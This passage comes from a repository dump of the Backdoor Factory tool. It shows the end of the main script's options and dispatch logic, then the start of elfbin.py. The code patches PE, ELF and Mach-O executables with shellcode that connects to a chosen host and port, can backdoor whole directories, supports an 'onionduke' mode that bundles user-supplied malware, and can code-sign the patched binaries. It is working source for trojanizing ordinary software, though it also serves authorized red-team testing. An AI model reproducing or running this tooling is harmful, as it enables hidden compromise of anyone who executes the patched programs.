\"--runas_admin\", dest=\"RUNAS_ADMIN\", default=False, action=\"store_true\",\n                      help=\"EXPERIMENTAL \"\n                      \"Checks the PE binaries for \\'requestedExecutionLevel level=\\\"highestAvailable\\\"\\'\"\n                      \". If this string is included in the binary, it must run as system/admin. If not \"\n                      \"in Support Check mode it will attmept to patch highestAvailable into the manifest \"\n                      \"if requestedExecutionLevel entry exists.\"\n                      )\n    parser.add_option(\"-L\", \"--patch_dll\", dest=\"PATCH_DLL\", default=True, action=\"store_false\",\n                      help=\"Use this setting if you DON'T want to patch DLLs. Patches by default.\"\n                      )\n    parser.add_option(\"-F\", \"--fat_priority\", dest=\"FAT_PRIORITY\", default=\"x64\", action=\"store\",\n                      help=\"For MACH-O format. If fat file, focus on which arch to patch. Default \"\n                      \"is x64. To force x86 use -F x86, to force both archs use -F ALL.\"\n                      )\n    parser.add_option(\"-B\", \"--beacon\", dest=\"BEACON\", default=15, action=\"store\", type=\"int\",\n                      help=\"For payloads that have the ability to beacon out, set the time in secs\"\n                      )\n    parser.add_option(\"-m\", \"--patch-method\", dest=\"PATCH_METHOD\", default=\"manual\", action=\"store\",\n                      type=\"string\", help=\"Patching methods for PE files, 'manual','automatic', replace \"\n                      \"and onionduke\")\n    parser.add_option(\"-b\", \"--user_malware\", dest=\"SUPPLIED_BINARY\", default=None, action=\"store\",\n                      help=\"For onionduke. Provide your desired binary.\")\n    parser.add_option(\"-X\", \"--xp_mode\", dest=\"XP_MODE\", default=False, action=\"store_true\",\n                      help=\"Default: DO NOT support for XP legacy machines, use -X to support XP\"\n                      \". By default the binary will crash on XP machines (e.g. sandboxes)\")\n    parser.add_option(\"-A\", \"--idt_in_cave\", dest=\"IDT_IN_CAVE\", default=False, action=\"store_true\",\n                      help=\"EXPERIMENTAL \"\n                      \"By default a new Import Directory Table is created in a new section, \"\n                      \"by calling this flag it will be put in a code cave.  This can cause bianry \"\n                      \"failure is some cases. Test on target binaries first.\"\n                      )\n    parser.add_option(\"-C\",\"--code_sign\", dest=\"CODE_SIGN\", default=False, action=\"store_true\", \n                      help=\"For those with codesigning certs wishing to sign PE binaries only. \" \n                      \"Name your signing key and private key signingcert.cer and signingPrivateKey.pem \"\n                      \"repectively in the certs directory it's up to you to obtain signing certs.\")\n    parser.add_option(\"-p\",\"--preprocess\", dest=\"PREPROCESS\", default=False, action=\"store_true\", \n                      help=\"To execute preprocessing scripts in the preprocess directory\")\n\n    (options, args) = parser.parse_args()\n\n    def basicDiscovery(FILE):\n        macho_supported = ['\\xcf\\xfa\\xed\\xfe', '\\xca\\xfe\\xba\\xbe',\n                           '\\xce\\xfa\\xed\\xfe',\n                           ]\n\n        testBinary = open(FILE, 'rb')\n        header = testBinary.read(4)\n        testBinary.close()\n        if 'MZ' in header:\n            return 'PE'\n        elif 'ELF' in header:\n            return 'ELF'\n        elif header in macho_supported:\n            return \"MACHO\"\n        else:\n            'Only support ELF, PE, and MACH-O file formats'\n            return None\n\n    if options.NO_BANNER is False:\n        print choice(menu)\n        print author\n        print version\n        time.sleep(.5)\n    else:\n        print \"\\t Backdoor Factory\"\n        print author\n        print version\n\n    if options.DIR:\n        for root, subFolders, files in os.walk(options.DIR):\n            for _file in files:\n                options.FILE = os.path.join(root, _file)\n                if os.path.isdir(options.FILE) is True:\n                    print \"Directory found, continuing\"\n                    continue\n                is_supported = basicDiscovery(options.FILE)\n                if is_supported is \"PE\":\n                    supported_file = pebin(options.FILE,\n                                           options.OUTPUT,\n                                           options.SHELL,\n                                           options.NSECTION,\n                                           options.DISK_OFFSET,\n                                           options.ADD_SECTION,\n                                           options.CAVE_JUMPING,\n                                           options.PORT,\n                                           options.HOST,\n                                           options.SUPPLIED_SHELLCODE,\n                                           options.INJECTOR,\n                                           options.CHANGE_ACCESS,\n                                           options.VERBOSE,\n                                           options.SUPPORT_CHECK,\n                                           options.SHELL_LEN,\n                                           options.FIND_CAVES,\n                                           options.SUFFIX,\n                                           options.DELETE_ORIGINAL,\n                                           options.CAVE_MINER,\n                                           options.IMAGE_TYPE,\n                                           options.ZERO_CERT,\n                                           options.RUNAS_ADMIN,\n                                           options.PATCH_DLL,\n                                           options.PATCH_METHOD,\n                                           options.SUPPLIED_BINARY,\n                                           options.XP_MODE,\n                                           options.IDT_IN_CAVE,\n                                           options.CODE_SIGN,\n                                           options.PREPROCESS,\n                                           )\n                elif is_supported is \"ELF\":\n                    supported_file = elfbin(options.FILE,\n                                            options.OUTPUT,\n                                            options.SHELL,\n                                            options.HOST,\n                                            options.PORT,\n                                            options.SUPPORT_CHECK,\n                                            options.FIND_CAVES,\n                                            options.SHELL_LEN,\n                                            options.SUPPLIED_SHELLCODE,\n                                            options.IMAGE_TYPE,\n                                            options.PREPROCESS,\n                                            )\n                elif is_supported is \"MACHO\":\n                    supported_file = machobin(options.FILE,\n                                              options.OUTPUT,\n                                              options.SHELL,\n                                              options.HOST,\n                                              options.PORT,\n                                              options.SUPPORT_CHECK,\n                                              options.SUPPLIED_SHELLCODE,\n                                              options.FAT_PRIORITY,\n                                              options.BEACON,\n                                              options.PREPROCESS,\n                                              )\n\n                if options.SUPPORT_CHECK is True:\n                    if os.path.isfile(options.FILE):\n                        is_supported = False\n                print \"file\", options.FILE\n                try:\n                    is_supported = supported_file.support_check()\n                except Exception, e:\n                    is_supported = False\n                    print 'Exception:', str(e), '%s' % options.FILE\n                if is_supported is False or is_supported is None:\n                    print \"%s is not supported.\" % options.FILE\n                            #continue\n                else:\n                    print \"%s is supported.\" % options.FILE\n                #    if supported_file.flItms['runas_admin'] is True:\n                #        print \"%s must be run as admin.\" % options.FILE\n                print \"*\" * 50\n\n        if options.SUPPORT_CHECK is True:\n            sys.exit()\n\n        print (\"You are going to backdoor the following \"\n               \"items in the %s directory:\"\n               % options.DIR)\n        dirlisting = os.listdir(options.DIR)\n        for item in dirlisting:\n            print \"     {0}\".format(item)\n        answer = raw_input(\"Do you want to continue? (yes/no) \")\n        if 'yes' in answer.lower():\n            for item in dirlisting:\n                #print item\n                print \"*\" * 50\n                options.File = options.DIR + '/' + item\n                if os.path.isdir(options.FILE) is True:\n                    print \"Directory found, continuing\"\n                    continue\n\n                print (\"backdooring file %s\" % item)\n                result = None\n                is_supported = basicDiscovery(options.FILE)\n                try:\n                    if is_supported is \"PE\":\n                        supported_file = pebin(options.FILE,\n                                               options.OUTPUT,\n                                               options.SHELL,\n                                               options.NSECTION,\n                                               options.DISK_OFFSET,\n                                               options.ADD_SECTION,\n                                               options.CAVE_JUMPING,\n                                               options.PORT,\n                                               options.HOST,\n                                               options.SUPPLIED_SHELLCODE,\n                                               options.INJECTOR,\n                                               options.CHANGE_ACCESS,\n                                               options.VERBOSE,\n                                               options.SUPPORT_CHECK,\n                                               options.SHELL_LEN,\n                                               options.FIND_CAVES,\n                                               options.SUFFIX,\n                                               options.DELETE_ORIGINAL,\n                                               options.CAVE_MINER,\n                                               options.IMAGE_TYPE,\n                                               options.ZERO_CERT,\n                                               options.RUNAS_ADMIN,\n                                               options.PATCH_DLL,\n                                               options.PATCH_METHOD,\n                                               options.SUPPLIED_BINARY,\n                                               options.XP_MODE,\n                                               options.IDT_IN_CAVE,\n                                               options.CODE_SIGN,\n                                               options.PREPROCESS,\n                                               )\n                        supported_file.OUTPUT = None\n                        supported_file.output_options()\n                        result = supported_file.patch_pe()\n                    elif is_supported is \"ELF\":\n                        supported_file = elfbin(options.FILE,\n                                                options.OUTPUT,\n                                                options.SHELL,\n                                                options.HOST,\n                                                options.PORT,\n                                                options.SUPPORT_CHECK,\n                                                options.FIND_CAVES,\n                                                options.SHELL_LEN,\n                                                options.SUPPLIED_SHELLCODE,\n                                                options.IMAGE_TYPE,\n                                                options.PREPROCESS,\n                                                )\n\n                        supported_file.OUTPUT = None\n                        supported_file.output_options()\n                        result = supported_file.patch_elf()\n\n                    elif is_supported is \"MACHO\":\n                        supported_file = machobin(options.FILE,\n                                                  options.OUTPUT,\n                                                  options.SHELL,\n                                                  options.HOST,\n                                                  options.PORT,\n                                                  options.SUPPORT_CHECK,\n                                                  options.SUPPLIED_SHELLCODE,\n                                                  options.FAT_PRIORITY,\n                                                  options.BEACON,\n                                                  options.PREPROCESS,\n                                                  )\n                        supported_file.OUTPUT = None\n                        supported_file.output_options()\n                        result = supported_file.patch_macho()\n\n                    if result is None:\n                        print 'Not Supported. Continuing'\n                        continue\n                    else:\n                        print (\"[*] File {0} is in backdoored \"\n                               \"directory\".format(supported_file.FILE))\n                except Exception as e:\n                    print \"DIR ERROR\", str(e)\n        else:\n            print(\"Goodbye\")\n\n        sys.exit()\n\n    if options.INJECTOR is True:\n        supported_file = pebin(options.FILE,\n                               options.OUTPUT,\n                               options.SHELL,\n                               options.NSECTION,\n                               options.DISK_OFFSET,\n                               options.ADD_SECTION,\n                               options.CAVE_JUMPING,\n                               options.PORT,\n                               options.HOST,\n                               options.SUPPLIED_SHELLCODE,\n                               options.INJECTOR,\n                               options.CHANGE_ACCESS,\n                               options.VERBOSE,\n                               options.SUPPORT_CHECK,\n                               options.SHELL_LEN,\n                               options.FIND_CAVES,\n                               options.SUFFIX,\n                               options.CAVE_MINER,\n                               options.DELETE_ORIGINAL,\n                               options.IMAGE_TYPE,\n                               options.ZERO_CERT,\n                               options.RUNAS_ADMIN,\n                               options.PATCH_DLL,\n                               options.PATCH_METHOD,\n                               options.SUPPLIED_BINARY,\n                               options.XP_MODE,\n                               options.IDT_IN_CAVE,\n                               options.CODE_SIGN,\n                               options.PREPROCESS,\n                               )\n        supported_file.injector()\n        sys.exit()\n\n    if not options.FILE:\n        parser.print_help()\n        sys.exit()\n\n    #OUTPUT = output_options(options.FILE, options.OUTPUT)\n    is_supported = basicDiscovery(options.FILE)\n    if is_supported is \"PE\":\n        supported_file = pebin(options.FILE,\n                               options.OUTPUT,\n                               options.SHELL,\n                               options.NSECTION,\n                               options.DISK_OFFSET,\n                               options.ADD_SECTION,\n                               options.CAVE_JUMPING,\n                               options.PORT,\n                               options.HOST,\n                               options.SUPPLIED_SHELLCODE,\n                               options.INJECTOR,\n                               options.CHANGE_ACCESS,\n                               options.VERBOSE,\n                               options.SUPPORT_CHECK,\n                               options.SHELL_LEN,\n                               options.FIND_CAVES,\n                               options.SUFFIX,\n                               options.DELETE_ORIGINAL,\n                               options.CAVE_MINER,\n                               options.IMAGE_TYPE,\n                               options.ZERO_CERT,\n                               options.RUNAS_ADMIN,\n                               options.PATCH_DLL,\n                               options.PATCH_METHOD,\n                               options.SUPPLIED_BINARY,\n                               options.XP_MODE,\n                               options.IDT_IN_CAVE,\n                               options.CODE_SIGN,\n                               options.PREPROCESS,\n                               )\n    elif is_supported is \"ELF\":\n        supported_file = elfbin(options.FILE,\n                                options.OUTPUT,\n                                options.SHELL,\n                                options.HOST,\n                                options.PORT,\n                                options.SUPPORT_CHECK,\n                                options.FIND_CAVES,\n                                options.SHELL_LEN,\n                                options.SUPPLIED_SHELLCODE,\n                                options.IMAGE_TYPE,\n                                options.PREPROCESS,\n                                )\n\n    elif is_supported is \"MACHO\":\n        supported_file = machobin(options.FILE,\n                                  options.OUTPUT,\n                                  options.SHELL,\n                                  options.HOST,\n                                  options.PORT,\n                                  options.SUPPORT_CHECK,\n                                  options.SUPPLIED_SHELLCODE,\n                                  options.FAT_PRIORITY,\n                                  options.BEACON,\n                                  options.PREPROCESS,\n                                  )\n\n    else:\n        print \"Not supported.\"\n        sys.exit()\n    result = supported_file.run_this()\n    if result is True and options.SUPPORT_CHECK is False and supported_file.OUTPUT is not None:\n        print \"File {0} is in the 'backdoored' directory\".format(os.path.basename(supported_file.OUTPUT))\n\n    #END BDF MAIN\n\nif __name__ == \"__main__\":\n\n    bdfMain()\n"
        },
        {
          "name": "certs",
          "type": "tree",
          "content": null
        },
        {
          "name": "elfbin.py",
          "type": "blob",
          "size": 37.646484375,
          "content": "#!/usr/bin/env python\n'''\n\nCopyright (c) 2013-2017, Joshua Pitts\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n    1. Redistributions of source code must retain the above copyright notice,\n    this list of conditions and the following disclaimer.\n\n    2. Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n    3. Neither the name of the copyright holder nor the names of its contributors\n    may be used to endorse or promote products derived from this software without\n    specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\nLIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n\n'''\n\nimport struct\nimport os\nimport shutil\nimport sys\nimport tempfile\nfrom intel.LinuxIntelELF32 import linux_elfI32_shellcode\nfrom intel.LinuxIntelELF64 import linux_elfI64_shellcode\nfrom intel.FreeBSDIntelELF32 import freebsd_elfI32_shellcode\n#from intel.FreeBSDIntelELF64 import freebsd_elfI64_shellcode\nfrom arm.LinuxARMLELF32 import linux_elfarmle32_shellcode\n\n\nclass elf():\n    \"\"\"\n    ELF data format class for BackdoorFactory.\n    We don't need the ENTIRE format.\n    \"\"\"\n\n    #setting linux header infomation\n    e_ident = {\"EI_MAG\": \"\\x7f\" + \"ELF\",\n               \"EI_CLASS\": {0x01: \"x86\",\n                            0x02: \"x64\"\n                            },\n               \"EI_DATA_little\": 0x01,\n               \"EI_DATA_big\": 0x02,\n               \"EI_VERSION\": 0x01,\n               \"EI_OSABI\": {0x00: \"System V\",\n                            0x01: \"HP-UX\",\n                            0x02: \"NetBSD\",\n                            0x03: \"Linux\",\n                            0x06: \"Solaris\",\n                            0x07: \"AIX\",\n                            0x08: \"IRIX\",\n                            0x09: \"FreeBSD\",\n                            0x0C: \"OpenBSD\"\n                            },\n               \"EI_ABIVERSION\": 0x00,\n               \"EI_PAD\": 0x07\n               }\n\n    e_type = {0x01: \"relocatable\",\n              0x02: \"executable\",\n              0x03: \"shared\",\n              0x04: \"core\"\n              }\n\n    e_machine = {0x02: \"SPARC\",\n                 0x03: \"x86\",\n                 0x14: \"PowerPC\",\n                 0x28: \"ARM\",\n                 0x32: \"IA-64\",\n                 0x3E: \"x86-64\",\n                 0xB7: \"AArch64\"\n                 }\n    e_version = 0x01\n#end elf class\n\n\nclass elfbin():\n    \"\"\"\n    This is the class handler for the elf binary format\n    \"\"\"\n    def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST=\"127.0.0.1\", PORT=8888,\n                 SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,\n                 SUPPLIED_SHELLCODE=None, IMAGE_TYPE=\"ALL\", PREPROCESS=False):\n        #print FILE\n        self.FILE = FILE\n        self.OUTPUT = OUTPUT\n        self.SHELL = SHELL\n        self.bin_file = None\n        self.HOST = HOST\n        self.PORT = PORT\n        self.FIND_CAVES = FIND_CAVES\n        self.SUPPORT_CHECK = SUPPORT_CHECK\n        self.SHELL_LEN = SHELL_LEN\n        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE\n        self.IMAGE_TYPE = IMAGE_TYPE\n        self.shellcode_vaddr = 0x0\n        self.PREPROCESS = PREPROCESS\n        self.ORIGINAL_FILE = self.FILE\n        self.tmp_file = None\n        self.keep_temp = False\n        self.file_size = os.path.getsize(self.FILE)\n        self.supported_types = {0x00:    # System V\n                                [[0x01,  # 32bit\n                                  0x02   # 64bit\n                                  ],\n                                 [0x03,  # x86\n                                  0x28,  # ARM\n                                  0x3E   # x64\n                                  ]],\n                                0x03:    # Linux\n                                [[0x01,  # 32bit\n                                  0x02   # 64bit\n                                  ],\n                                 [0x03,  # x86\n                                  0x3E   # x64\n                                  ]],\n                                0x09:    # FreeBSD\n                                [[0x01,  # 32bit\n                                 # 0x02  # 64bit\n                                  ],\n                                 [0x03,  # x86\n                                  # 0x3E # x64\n                                  ]],\n                                0x0C:    # OpenBSD\n                                [[0x01,  # 32bit\n                                 #0x02   # 64bit\n                                  ],\n                                 [0x03,  # x86\n                                  #0x3E  # x64\n                                  ]]\n                                }\n\n    def run_this(self):\n        '''\n        Call this if you want to run the entire process with a ELF binary.\n        '''\n        #self.print_supported_types()\n        self.bin_file = open(self.FILE, \"r+b\")\n        if self.FIND_CAVES is True:\n            self.support_check()\n            self.gather_file_info()\n            if self.supported is False:\n                print self.FILE, \"is not supported.\"\n                return False\n            print (\"Looking for caves with a size of %s \"\n                   \"bytes (measured as an integer)\"\n                   % self.SHELL_LEN)\n            self.find_all_caves()\n            return True\n        if self.SUPPORT_CHECK is True:\n            if not self.FILE:\n                print \"You must provide a file to see if it is supported (-f)\"\n                return False\n            try:\n                self.support_check()\n            except Exception, e:\n                self.supported = False\n                print 'Exception:', str(e), '%s' % self.FILE\n            if self.supported is False:\n                print \"%s is not supported.\" % self.FILE\n                self.print_supported_types()\n                return False\n            else:\n                print \"%s is supported.\" % self.FILE\n                return True\n\n        return self.patch_elf()\n\n    def find_all_caves(self):\n        \"\"\"\n        This function finds all the codecaves in a inputed file.\n        Prints results to screen. Generally not many caves in the ELF\n        format.  And why there is no need to cave jump.\n        \"\"\"\n\n        print \"[*] Looking for caves\"\n        SIZE_CAVE_TO_FIND = 94\n        BeginCave = 0\n        Tracking = 0\n        count = 1\n        caveTracker = []\n        caveSpecs = []\n        self.bin_file.seek(0)\n        while True:\n            try:\n                s = struct.unpack(\"<b\", self.bin_file.read(1))[0]\n            except:\n                break\n            if s == 0:\n                if count == 1:\n                    BeginCave = Tracking\n                count += 1\n            else:\n                if count >= SIZE_CAVE_TO_FIND:\n                    caveSpecs.append(BeginCave)\n                    caveSpecs.append(Tracking)\n                    caveTracker.append(caveSpecs)\n                count = 1\n                caveSpecs = []\n\n            Tracking += 1\n\n        for caves in caveTracker:\n\n            for section in self.sec_hdr.iteritems():\n                #print 'section', section[1]\n                section = section[1]\n                sectionFound = False\n                if caves[0] >= section['sh_offset'] and caves[1] <= (section['sh_size'] + section['sh_offset']) and \\\n                   caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:\n                    print \"We have a winner:\", section['name']\n                    print '->Begin Cave', hex(caves[0])\n                    print '->End of Cave', hex(caves[1])\n                    print 'Size of Cave (int)', caves[1] - caves[0]\n                    print 'sh_size', hex(section['sh_size'])\n                    print 'sh_offset', hex(section['sh_offset'])\n                    print 'End of Raw Data:', hex(section['sh_size'] + section['sh_offset'])\n                    print '*' * 50\n                    sectionFound = True\n                    break\n            if sectionFound is False:\n                try:\n                    print \"No section\"\n                    print '->Begin Cave', hex(caves[0])\n                    print '->End of Cave', hex(caves[1])\n                    print 'Size of Cave (int)', caves[1] - caves[0]\n                    print '*' * 50\n                except Exception as e:\n                    print str(e)\n        print \"[*] Total of %s caves found\" % len(caveTracker)\n\n    def loadthis(self, amod):\n        section = amod.split('.')\n        mod = \".\".join(section[:-1])\n        amod = __import__(mod)\n        for item in section[1:]:\n            amod = getattr(amod, item)\n        return amod\n\n    def preprocess(self):\n        # files in directory\n        ignore = ['__init__.py']\n        abspath = os.path.abspath(__file__)\n        dname = os.path.dirname(abspath)\n        sys.path.append(dname)\n        for afile in os.listdir(dname + \"/preprocessor\"):\n            if afile in ignore:\n                continue\n            if \".pyc\" in afile:\n                continue\n            \n            if len(afile.split(\".\")) > 2:\n                print \"!\" * 50\n                print \"\\t[!] Make sure there are no '.' in your preprocessor filename:\", afile\n                print \"!\" * 50\n                \n                return False\n            \n            name = \"preprocessor.\" +  afile.strip(\".py\")\n            \n            preprocessor_name = __import__( name, fromlist=[''])\n            \n            if preprocessor_name.enabled is True:\n                print \"[*] Executing preprocessor:\", afile.strip(\".py\")\n            else:\n                continue\n\n            if preprocessor_name.file_format.lower() in ['elf', 'all']: #'elf', 'macho', 'mach-o']:\n                print '[*] Running preprocessor', afile.strip(\".py\"), \"against\", preprocessor_name.file_format, \"formats\"\n            else:\n                continue\n            \n            # Allow if any processors to keep it \n            if self.keep_temp is False:\n                self.keep_temp = preprocessor_name.keep_temp\n            \n            # create tempfile here always\n            \n            if self.tmp_file == None:\n                self.tmp_file = tempfile.NamedTemporaryFile()\n                self.tmp_file.write(open(self.FILE, 'rb').read())\n                self.tmp_file.seek(0)\n                print \"[*] Creating temp file:\", self.tmp_file.name\n            else:\n                print \"[*] Using existing tempfile from prior preprocessor\"\n            \n            load_name = name +  \".preprocessor\"\n            preproc = self.loadthis(load_name)\n            \n            m = preproc(self)\n            \n            print \"=\" * 50\n            \n            # execute preprocessor\n            result = m.run()\n            \n            if result is False:\n                print \"[!] Preprocessor Failure :(\"\n\n            print \"=\" * 50\n            \n            # After running push it to BDF.\n            \n            self.FILE = self.tmp_file.name[:]\n    \n            # check for support after each modification\n            if preprocessor_name.recheck_support is True:\n                issupported = self.support_check()\n                if issupported is False:\n                    print self.FILE, \"is not supported.\"\n                    return False                \n\n    def set_shells(self):\n        \"\"\"\n        This function sets the shellcode.\n        \"\"\"\n\n        avail_shells = []\n\n        self.bintype = False\n        if self.e_machine == 0x03:  # x86 chipset\n            if self.EI_CLASS == 0x1:\n                if self.EI_OSABI == 0x00:\n                    self.bintype = linux_elfI32_shellcode\n                elif self.EI_OSABI == 0x09 or self.EI_OSABI == 0x0C:\n                    self.bintype = freebsd_elfI32_shellcode\n        elif self.e_machine == 0x3E:  # x86-64 chipset\n            if self.EI_CLASS == 0x2:\n                if self.EI_OSABI == 0x00:\n                    self.bintype = linux_elfI64_shellcode\n                elif self.EI_OSABI == 0x03:\n                    self.bintype = linux_elfI64_shellcode\n                #elif self.EI_OSABI == 0x09:\n                #    self.bintype = freebsd_elfI64_shellcode\n        elif self.e_machine == 0x28:  # ARM chipset\n            if self.EI_CLASS == 0x1:\n                if self.EI_OSABI == 0x00:\n                    self.bintype = linux_elfarmle32_shellcode\n\n        if self.bintype is False:\n            print \"[!] Unusual binary type\"\n            return False\n\n        if not self.SHELL:\n            print \"You must choose a backdoor to add: \"\n            for item in dir(self.bintype):\n                if \"__\" in item:\n                    continue\n                elif (\"returnshellcode\" == item\n                      or \"pack_ip_addresses\" == item\n                      or \"eat_code_caves\" == item\n                      or 'ones_compliment' == item\n                      or 'resume_execution' in item\n                      or 'returnshellcode' in item):\n                    continue\n                else:\n                    print \"   {0}\".format(item)\n            return False\n        if self.SHELL not in dir(self.bintype):\n            print \"The following %ss are available:\" % str(self.bintype).split(\".\")[1]\n            for item in dir(self.bintype):\n                #print item\n                if \"__\" in item:\n                    continue\n                elif (\"returnshellcode\" == item\n                      or \"pack_ip_addresses\" == item\n                      or \"eat_code_caves\" == item\n                      or 'ones_compliment' == item\n                      or 'resume_execution' in item\n                      or 'returnshellcode' in item):\n                    continue\n                else:\n                    print \"   {0}\".format(item)\n                    avail_shells.append(item)\n            self.avail_shells = avail_shells\n            return False\n        #else:\n        #    shell_cmd = self.SHELL + \"()\"\n        if self.e_machine == 0x28:\n            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE, self.shellcode_vaddr)\n        else:\n            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)\n        self.allshells = getattr(self.shells, self.SHELL)(self.e_entry)\n        self.shellcode = self.shells.returnshellcode()\n\n    def print_supported_types(self):\n        \"\"\"\n        Prints supported types\n        \"\"\"\n        print \"Supported system types:\"\n        for system_type in self.supported_types.iteritems():\n            print \"    \", elf.e_ident[\"EI_OSABI\"][system_type[0]]\n            print \"     Arch type:\"\n            for class_type in system_type[1][0]:\n                print \"\\t\", elf.e_ident['EI_CLASS'][class_type]\n            print \"     Chip set:\"\n            for e_mach_type in system_type[1][1]:\n                print \"\\t\", elf.e_machine[e_mach_type]\n            #print \"Supported class types:\"\n            print \"*\" * 25\n\n    def support_check(self):\n        \"\"\"\n        Checks for support\n        \"\"\"\n        with open(self.FILE, 'r+b') as bin_file:\n            print \"[*] Checking file support\"\n            bin_file.seek(0)\n            if bin_file.read(4) == elf.e_ident[\"EI_MAG\"]:\n                bin_file.seek(4, 0)\n                self.class_type = struct.unpack(\"<B\", bin_file.read(1))[0]\n                bin_file.seek(7, 0)\n                self.EI_OSABI = struct.unpack(\"<B\", bin_file.read(1))[0]\n                self.supported = False\n                for system_type in self.supported_types.iteritems():\n                    if self.EI_OSABI == system_type[0]:\n                        print \"[*] System Type Supported:\", elf.e_ident[\"EI_OSABI\"][system_type[0]]\n                        if self.class_type == 0x1 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):\n                            self.supported = True\n                        elif self.class_type == 0x2 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):\n                            self.supported = True\n                        break\n\n            else:\n                self.supported = False\n\n    def get_section_name(self, section_offset):\n        \"\"\"\n        Get section names\n        \"\"\"\n        if self.e_shstrndx not in self.sec_hdr:\n            print \"[!] Failed to get self.e_shstrndx. Fuzzing?\"\n            return False\n        if self.sec_hdr[self.e_shstrndx]['sh_offset'] > self.file_size:\n            print \"[!] Fuzzing the sh_offset\"\n            return False\n        self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset'] + section_offset, 0)\n        name = ''\n        j = ''\n        while True:\n            j = self.bin_file.read(1)\n            if len(j) == 0:\n                break\n            elif j == \"\\x00\":\n                break\n            else:\n                name += j\n        #print \"name:\", name\n        return name\n\n    def set_section_name(self):\n        \"\"\"\n        Set the section names\n        \"\"\"\n         #how to find name section specifically\n        for i in range(0, self.e_shstrndx + 1):\n            self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])\n            if self.sec_hdr[i]['name'] is False:\n                print \"Failure in naming, fuzzing?\"\n                return False\n        if self.sec_hdr[i]['name'] == \".text\":\n                #print \"Found text section\"\n                self.text_section = i\n\n    def gather_file_info(self):\n        '''\n        Gather info about the binary\n        '''\n        print \"[*] Gathering file info\"\n        bin = self.bin_file\n        bin.seek(0)\n        EI_MAG = bin.read(4)\n        self.EI_CLASS = struct.unpack(\"<B\", bin.read(1))[0]\n        self.EI_DATA = struct.unpack(\"<B\", bin.read(1))[0]\n        if self.EI_DATA == 0x01:\n            #little endian\n            self.endian = \"<\"\n        else:\n            #big self.endian\n            self.endian = \">\"\n        self.EI_VERSION = struct.unpack('<B', bin.read(1))[0]\n        self.EI_OSABI = struct.unpack('<B', bin.read(1))[0]\n        self.EI_ABIVERSION = struct.unpack('<B', bin.read(1))[0]\n        self.EI_PAD = struct.unpack(self.endian + \"BBBBBBB\", bin.read(7))[0]\n        self.e_type = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        self.e_machine = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        self.e_version = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n        #print \"EI_Class\", self.EI_CLASS\n        if self.EI_CLASS == 0x01:\n            #\"32 bit \"\n            self.e_entryLocOnDisk = bin.tell()\n            self.e_entry = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n            #print hex(self.e_entry)\n            self.e_phoff = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n            self.e_shoff = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n        else:\n            #\"64 bit \"\n            self.e_entryLocOnDisk = bin.tell()\n            self.e_entry = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n            self.e_phoff = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n            self.e_shoff = struct.unpack(self.endian + \"Q\", bin.read(8))[0]\n        self.VrtStrtngPnt = self.e_entry\n        self.e_flags = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n        self.e_ehsize = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        self.e_phentsize = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        self.e_phnum = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        self.e_shentsize = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        self.e_shnum = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        self.e_shstrndx = struct.unpack(self.endian + \"H\", bin.read(2))[0]\n        \n        #section tables\n        if self.e_phoff > os.path.getsize(self.FILE):\n            print \"[!] El fuzzero\"\n            return False\n        bin.seek(self.e_phoff, 0)\n            \n        #header tables\n        if self.e_shnum == 0:\n            print \"[*] More than 0xFF00 sections\"\n            print \"[*] NOPE NOPE NOPE\"\n            return False\n            \n        else:\n            self.real_num_sections = self.e_shnum\n\n        if self.e_phoff > self.file_size:\n            print \"[*] e_phoff is greater than file size\"\n            return False\n\n        bin.seek(self.e_phoff, 0)\n        self.prog_hdr = {}\n        for i in range(self.e_phnum):\n            self.prog_hdr[i] = {}\n            if self.EI_CLASS == 0x01:\n                if self.e_phoff + (self.e_phnum * 4 * 8) > self.file_size:\n                    print \"[!] e_phoff and e_phnum is greater than the file size\"\n                    return False\n                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + \"I\", bin.read(4))[0]\n                self.prog_hdr[i]['p_offset'] 